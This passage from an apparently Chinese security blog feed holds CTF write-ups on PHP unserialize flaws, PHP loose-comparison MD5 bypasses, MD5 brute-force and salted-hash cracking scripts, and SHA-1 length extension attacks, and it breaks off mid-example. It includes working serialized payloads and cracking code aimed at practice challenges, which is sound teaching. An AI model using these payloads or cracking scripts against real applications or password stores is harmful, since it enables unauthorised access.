    <content type="html"><![CDATA[<p>python 快速抓取网页内容 </p><a id="more"></a><h1 id="两道例题"><a href="#两道例题" class="headerlink" title="两道例题"></a>两道例题</h1><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p><img src="1.png" alt></p><p>python 代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">flag = b64decode(‘flag’)</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'margin'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p><img src="2.png" alt></p><p>python 代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'key'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python 快速抓取网页内容 &lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://archimesan.me/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>序列化漏洞</title>
    <link href="http://archimesan.me/2017/12/25/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://archimesan.me/2017/12/25/序列化漏洞/</id>
    <published>2017-12-25T11:45:54.000Z</published>
    <updated>2019-03-22T07:03:56.806Z</updated>
    
    <content type="html"><![CDATA[<p>几个序列号漏洞的例子。</p><a id="more"></a><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>神盾局的秘密</p><p>看下逻辑<br>看源码发现了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</span><br></pre></td></tr></table></figure></p><p>这里有个文件包含，base64 解码之后得到 shield.jpg</p><p>尝试读取 index.php</p><p><img src="1_4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    require_once(<span class="string">'shield.php'</span>);</span><br><span class="line">    <span class="variable">$x</span> = new Shield();</span><br><span class="line">    isset(<span class="variable">$_GET</span>[<span class="string">'class'</span>]) &amp;&amp; <span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!empty(<span class="variable">$g</span>)) &#123;</span><br><span class="line">        <span class="variable">$x</span> = unserialize(<span class="variable">$g</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$x</span>-&gt;readfile();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用同样的方法读取 shield.php</p><p><img src="1_4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">readfile</span></span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (!empty(<span class="variable">$this</span>-&gt;file) &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'..'</span>)===FALSE  </span><br><span class="line">            &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'/'</span>)===FALSE &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'\\'</span>)==FALSE) &#123;</span><br><span class="line">                <span class="built_in">return</span> @file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最简单的序列化漏洞<br>直接利用脚本生成序列化的值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">readfile</span></span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (!empty(<span class="variable">$this</span>-&gt;file) &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'..'</span>)===FALSE  </span><br><span class="line">            &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'/'</span>)===FALSE &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'\\'</span>)==FALSE) &#123;</span><br><span class="line">                <span class="built_in">return</span> @file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = new Shield();</span><br><span class="line"><span class="variable">$q</span>-&gt;file = <span class="string">'pctf.php'</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$q</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = new Shield();</span><br><span class="line"><span class="variable">$q</span>-&gt;file = <span class="string">'pctf.php'</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$q</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>payload 如下：</p><p><img src="1_3.png" alt></p><p><img src="1_4.png" alt></p><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var <span class="variable">$enter</span>;</span><br><span class="line">    var <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        <span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">        <span class="variable">$o</span>-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.<span class="variable">$o</span>-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<br>一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用 a=&amp;b<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">poc：</span><br><span class="line">    &lt;?php   </span><br><span class="line">    class just4fun &#123;  </span><br><span class="line">        var <span class="variable">$enter</span>;  </span><br><span class="line">        var <span class="variable">$secret</span>;  </span><br><span class="line">        <span class="keyword">function</span> just4fun()  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="variable">$this</span>-&gt;enter=&amp;<span class="variable">$this</span>-&gt;secret;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">echo</span> serialize(new just4fun());  </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure></p><p>输出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:<span class="string">"just4fun"</span>:2:&#123;s:5:<span class="string">"enter"</span>;N;s:6:<span class="string">"secret"</span>;R:2;&#125;</span><br></pre></td></tr></table></figure></p><p>payload：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=O:8:<span class="string">"just4fun"</span>:2:&#123;s:5:<span class="string">"enter"</span>;N;s:6:<span class="string">"secret"</span>;R:2;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p><img src="3_1.png" alt></p><p><img src="3_2.png" alt></p><p>点击没反应 根据提示加上 ?hint=1 发现源码</p><p><img src="3_3.png" alt></p><p>源码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">'ISecer'</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'hint'</span>]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize(<span class="variable">$cookie</span>) === <span class="string">"<span class="variable">$KEY</span>"</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$flag</span>"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：这题很奇怪<br>要传一个 cookie 名为 ISecer 的反序列的值。并且反序列后的值要全相等于 ”$KEY”<br>这里要注意是有双引号。<br>而且$KEY的传值是在此之后的。所以反序列的值不是 ’ISecer:<a href="http://www.isecer.com’。难道一开始" target="_blank" rel="noopener">www.isecer.com’。难道一开始</a> $key 的值是 “”???<br>我们要得到的值是 string(0) “” 所以序列化该值即可。</p><p><img src="3_4.png" alt></p><h2 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h2><p>bool 绕过</p><p><img src="4_1.png" alt></p><p><img src="4_2.png" alt></p><p>点击”登录”没反应，右击查看源代码，发现这么一段：</p><p><img src="4_3.png" alt></p><p>这里说明要为用户名传入一个字符串，并且它经过md5加密后要等于 0。<br>在某些情况下，PHP 会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: ‘3’ == ‘3ascasd’ 结果为 true。<br>因此只要找到一个字串加密后第一个字符为0即可，这里提供几个：240610708，aabg7XSs，aabC9RqS<br>在用户名处输入以上其中一个字符串，提交后出现提示： /user.php?fame=hjkleffifer</p><p>访问得到源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>)&#123;</span><br><span class="line">print_r(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<br>代码意思是把 post 提交的 password 值经过”反序列化”得到一个数组，要求数组里的 user 和 pass 都等于某个值时就打印 flag。<br>但是我们不知道两处 ??? 到底是什么，因此无法考虑用 php 函数构造这样的值。<br>别忘了还有一个提示： “伟大的科学家 php 方言道：成也布尔，败也布尔” ，bool 类型的 true 跟任意字符串可以弱类型相等。因此我们可以构造 bool 类型的序列化数据 ，无论比较的值是什么，结果都为true。（a 代表 array，s代表 string，b 代表 bool，而数字代表个数/长度）</p><p>构造 password 值为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></p><p>在密码栏中提交构造的值，即可获取 flag: ctf{dwduwkhduw5465}</p><p><img src="4_4.png" alt></p><p><img src="4_5.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;几个序列号漏洞的例子。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
      <category term="常见漏洞" scheme="http://archimesan.me/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>MD5 爆破问题</title>
    <link href="http://archimesan.me/2017/12/24/MD5%E7%88%86%E7%A0%B4%E9%97%AE%E9%A2%98/"/>
    <id>http://archimesan.me/2017/12/24/MD5爆破问题/</id>
    <published>2017-12-24T12:18:20.000Z</published>
    <updated>2019-03-22T07:03:56.790Z</updated>
    
    <content type="html"><![CDATA[<p>几道 MD5 爆破问题</p><a id="more"></a><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>md5多一位</p><p><img src="1_1.png" alt></p><p>代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mymd5=<span class="string">"d78b6f302l25cdc811adfe8d4e7c9fd34"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(33):</span><br><span class="line">    newmd5=mymd5[:i]+mymd5[i+1:]</span><br><span class="line">    <span class="built_in">print</span> newmd5</span><br></pre></td></tr></table></figure></p><p>难道是逐个解密？？</p><p>不对。</p><p>MD5 包含0-9a-f共16个字符，不存在 l </p><p>很明显应该去掉 l </p><p>对 “d78b6f30225cdc811adfe8d4e7c9fd34” 进行解密即可。</p><p><img src="1_2.png" alt></p><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p>代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">def <span class="built_in">test</span>():</span><br><span class="line">    count=0</span><br><span class="line">    md5=<span class="string">'38e4c352809e150186920aac37190cbc'</span></span><br><span class="line">    str=<span class="string">'flag&#123;www_shiyanbar_com_is_very_good_'</span></span><br><span class="line">    <span class="keyword">while</span> count==0:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">            a=chr(i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                b=chr(i)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                    c=chr(i)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                        d=chr(i)</span><br><span class="line">                        <span class="built_in">test</span>=str+a+b+c+d+<span class="string">'&#125;'</span></span><br><span class="line">                        m=hashlib.md5()</span><br><span class="line">                        m.update(<span class="built_in">test</span>)</span><br><span class="line">                        m=m.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span>(cmp(m,md5)==0):</span><br><span class="line">                             count=1</span><br><span class="line">                             <span class="built_in">print</span> <span class="string">'ok'</span></span><br><span class="line">                             <span class="built_in">print</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">test</span>()</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure></p><h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p>md5加盐爆破</p><p>题目：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have found a passwd file containing salted passwords. An unprotected configuration file has revealed a salt of 5948. The hashed password <span class="keyword">for</span> the <span class="string">'admin'</span> user appears to be 81bdf501ef206ae7d3b92070196f7e98, try to brute force this password.</span><br></pre></td></tr></table></figure></p><p>python 脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf -*-</span></span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    f=open(<span class="string">'1.txt'</span>,<span class="string">'rb'</span>).readlines()</span><br><span class="line">    salt=<span class="string">'5948'</span></span><br><span class="line">    m=<span class="string">'81bdf501ef206ae7d3b92070196f7e98'</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        t=line.strip()+salt</span><br><span class="line">        t=md5(t).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t==m:</span><br><span class="line">            <span class="built_in">print</span> line.strip()</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;几道 MD5 爆破问题&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>hash长度扩展攻击</title>
    <link href="http://archimesan.me/2017/12/23/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://archimesan.me/2017/12/23/hash长度扩展攻击/</id>
    <published>2017-12-23T11:18:25.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>hash 长度扩展攻击原理和实例</p><a id="more"></a><h1 id="sha1-的-hash-原理"><a href="#sha1-的-hash-原理" class="headerlink" title="sha1 的 hash 原理"></a>sha1 的 hash 原理</h1><p>谈一下对 sha1 加密的理解。</p><p><img src="1.jpeg" alt></p><p>首先，当 hash 函数拿到需要被 hash 的字符串后，先将其字节长度整除 64，取得余数。如果该余数正好等于 56，那么就在该字符串最后添加上 8 个字节的长度描述符（具体用bit表示）。如果不等于 56，就先对字符串进行长度填充，填充时第一个字节为 hex(80)，其他字节均用 hex(00) 填充，填充至余数为 56 后，同样增加 8 个字节的长度描述符（该长度描述符为需要被 hash 的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。</p><p>补位完成后，字符串以 64 位一组进行分组（因为上面的余数为 56,加上 8 个字节的长度描述符后，正好是 64 位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的 registers 值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的 registers 值就是最后的 hash 值。</p><p>在 sha1 的运算过程中，为确保同一个字符串的 sha1 值唯一，所以需要保证第一次 registers 的值也唯一。所以在 sha1 算法中，registers 具有初始值（固定的）。如上图中的 registers 值 0。<br>Hash 值的随机性完全依赖于进行 “复杂的数学变化” 时输入的 registers 值和该次运算中字符串分组的数据。如果进行 “复杂数学变化” 时输入的 registers 值和该次运算的字符串分组相同，那么他们各自生成的新的 registers 值也相同。</p><h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>当需要被 hash 的字符串为 str_a = “123456”，程序首先判断，len(str_a) % 64 == 56 是否成立。这里很明显不成立。那么程序就进行补位操作。首先补位成余数为 56 的长度。</p><p><img src="2.jpeg" alt></p><p>如上图，蓝色字体就为程序对该字符串进行补位的数据。当满足 len(str_a) % 64 == 56 后，程序就在该字符串的后面添加 8 个字节的长度描述符。注意，此处的长度为原始需要被 hash 的长度。也就是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len(str_a) = 6 字节 *8bit/字节 = 48bit = 0x30bit。</span><br></pre></td></tr></table></figure></p><p><img src="3.jpeg" alt></p><p>补位+长度描述符 = 64 个字节，正好是一个分组。所以此处只要进行一次复杂的数学变化就可以了。程序根据该 64 个字节的数据和 registers 值 0 生成新的 registers 值 1。那么该新的 registers 值 1 就是 str_a 的 sha1 值。</p><h2 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h2><p>讲了这么多，好像都没讲到如何利用该扩展攻击。那么下面，重点来了。</p><p>简单来说，就是服务器上会生成一个 salt 值，该 salt 值你是不可预测的。但是你又知道了 sha1(salt+filename)的值，该 filename 的值你也是知道的。假设此处的 filename 的值 report.pdf，最后 sha1 的值为：0a8d538b724c6f2b4288526eb540ee7c。为了方便理解，我们继续假设 salt 的长度为 16 位。</p><p><img src="4.jpeg" alt></p><p>将上图的字符串进行 sha1 操作时，同样先进行整除，然后取余。最后再补上 8 位的长度描述符。补位+添加长度描述符后的字符串如下图：</p><p><img src="5.jpeg" alt></p><p>该长度也就满足了 64 位的分组，只需要进行一次 “复杂的数学运算” 就可以得到最后的sha1值了。<br>下面请各位看官思考如何进行下面一个字符串的 sha1 操作。</p><p><img src="6.jpeg" alt></p><p>同样，还是先进行分组。由于该字符串的长度大于 64 个字节，且小于 128 个字节，所以要分成两组，需要进行两次“复杂的数学运算”。这个时候我们发现，第一个分组的数据和上图中补码后的数据完全一样，又因为他们都是第一个分组，初始的 registers 值也一样。那么经过第一轮“复杂的数学运算”，他们各自生成的 registers 值也同样是相同的。唯一不同的是，由于上面的长度小于 64 字节，所以只需要进行一轮运算便得到了最后的 sha1 值。然后这里的字符串有两个分组，需要将第一轮更新的 registers 值（也就是第一轮运算出来的 sha1 值）作为第二轮“复杂的数学运算”的 registers 值，然后才能得出最终的 sha1 值。</p><p>根据上面例子就说明，如果 salt 的值你不知道，但是你知道长度，又知道 sha1(salt)，那么就也就可以知道 sha1(salt+“填充数据”+“任意可控数据”).这里的 salt+“填充数据”就是对 salt 进行 sha1 时所补全的数据+最后8位的长度描述符。一般来说，salt+”填充数据”的长度就是64字节，正好是一个分组。如果 salt 的长度就大于了56个字节，那么加入填充数据后的长度应该是N个64字节，等于 N 个分组。如果最后一块长度大于 56 或等于 64 时一直填充到多出一个块并且该块长度为 56 字节。<br>为什么？你可以想象，sha1 程序再对（salt+“填充数据”+“任意可控数据”）进行 hash 时，只需要进行第二轮及第二轮以后的运算。因为第一轮运算后的 registers 值就是 sha1(salt)的值，该值你已经知道了。</p><p>PS : MD5、SHA-1、SHA-2 类似</p><h1 id="hash-长度扩展攻击实例"><a href="#hash-长度扩展攻击实例" class="headerlink" title="hash 长度扩展攻击实例"></a>hash 长度扩展攻击实例</h1><h2 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h2><p><img src="1.png" alt></p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p><img src="4.png" alt></p><p>源码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 